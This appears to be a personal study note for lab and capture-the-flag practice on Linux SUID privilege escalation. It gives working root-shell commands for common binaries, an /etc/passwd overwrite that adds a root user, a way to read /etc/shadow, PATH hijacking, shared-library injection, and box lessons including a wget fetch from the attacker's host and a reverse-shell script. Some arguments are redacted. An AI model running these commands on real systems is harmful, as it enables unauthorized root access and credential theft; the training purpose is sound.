# SUID / SGID Privilege Escalation

Back to [[Linux-PrivEsc-Methodology]]

## Find SUID / SGID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Check every result on [GTFOBins](https://gtfobins.github.io/#+suid).

## Common SUID Exploits

### find
```bash
find . -exec /bin/bash -p REDACTED
```

### vim
```bash
vim -c ':!/bin/bash'
```

### nmap (older versions with interactive mode)
```bash
nmap --interactive
!sh
```

### python3
```bash
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### env
```bash
env /bin/bash -p
REDACTED

### cp — overwrite /etc/passwd
```bash
# Generate password hash
openssl passwd -1 NewPassword

# Copy passwd, add root user
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:REDACTED:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd

su hacker
# Password: NewPassword
```

### base64 — read any file
```bash
base64 /etc/shadow | base64 -d
```

## Custom SUID Binary — Relative Path Abuse

If a SUID binary calls a command without full path:
```bash
# Inspect it
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary
```

If it calls e.g. `service` without `/usr/sbin/service`:
```bash
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:REDACTED
/path/to/suid_binary
```

## Custom SUID Binary — Shared Library Injection

```bash
# Check for missing shared libraries
ldd /path/to/suid_binary
strace /path/to/suid_binary 2>&1 | grep "No such file"
```

If it loads from a writable path, drop a malicious `.so` there.

---

## From Your Boxes

> **XposedAPI** (PG) — wget had SUID bit set; used it to overwrite /etc/passwd with a crafted version containing a root-level user
> - What worked: `wget -O /etc/passwd http://KALI/passwd`
> - Lesson: wget SUID = arbitrary file write. Create a passwd entry with `openssl passwd -1` and overwrite /etc/passwd.

> **Sorcerer** (PG) — start-stop-daemon had SUID; GTFOBins entry gave instant root shell
> - What worked: `/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p`
> - Lesson: Always use absolute paths for SUID binaries if the relative path fails.

> **QuackerJack** (PG) — find binary had SUID bit set
> - What worked: `find . -exec /bin/sh -p REDACTED -quit`
> - Lesson: find SUID is a classic instant-root via GTFOBins.

> **Nibbles** (PG) — find binary had SUID bit, same as QuackerJack
> - What worked: GTFOBins SUID method for find
> - Lesson: Same binary appears across multiple boxes. Memorize the top 10 GTFOBins SUID entries.

> **DolphinV2** (VHL) — make had SUID bit set
> - What worked: GTFOBins SUID entry for make → instant root
> - Lesson: Even build tools like make can be SUID. Always cross-reference the full SUID list against GTFOBins.

> **Astronaut** (PG) — PHP 7.4 had SUID bit set
> - What worked: GTFOBins SUID entry for PHP
> - Lesson: Language interpreters with SUID (php, python, perl) are easy wins.

> **Natural** (VHL) — /bin/bash itself had SUID bit set
> - What worked: `/bin/bash -p`
> - Lesson: Always check the obvious. Sometimes bash itself has SUID.

> **MZEEAV** (PG) — Custom SUID binary /opt/fileS not in GTFOBins, but behaved like find
> - What worked: Used find-style `-exec` payload against the custom binary
> - Lesson: Custom SUID binaries may wrap standard tools. Test GTFOBins techniques even on unknown binaries.

> **Irked** (HTB) — Custom SUID binary "viewuser" tried to execute /tmp/listusers
> - What worked: Created /tmp/listusers as a reverse shell script
> - Lesson: Run `strings` and `ltrace` on unknown SUID binaries to find what files/commands they call.

> **Wheels** (PG) — /opt/get-list had SUID bit set (custom binary)
> - What worked: Analyzed the binary behavior to find exploitation path
> - Lesson: Custom SUID binaries require reverse engineering with strings/ltrace/strace.
